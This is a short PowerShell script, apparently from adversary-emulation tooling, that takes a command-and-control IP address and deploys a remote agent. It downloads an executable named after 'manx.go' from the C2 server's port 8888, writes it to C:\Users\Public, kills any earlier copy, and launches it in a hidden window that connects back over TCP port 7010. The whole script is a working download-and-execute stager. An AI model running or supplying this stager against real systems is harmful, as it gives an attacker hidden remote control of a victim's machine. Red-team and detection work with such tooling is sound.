# Author: Roberto Rodriguez (@Cyb3rWard0g)
# License: GPL-3.0

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$C2IPAddress
)

if ($host.Version.Major -ge 3)
{
    $ErrAction= "ignore"
}
else
{
    $ErrAction= "SilentlyContinue"
}
$server="http://$C2IPAddress`:8888"
$socket="$C2IPAddress`:7010"
$contact="tcp"
$url="$server/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","manx.go")
$data=$wc.DownloadData($url)
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")
Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea $ErrAction
rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null

Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact tcp" -WindowStyle hidden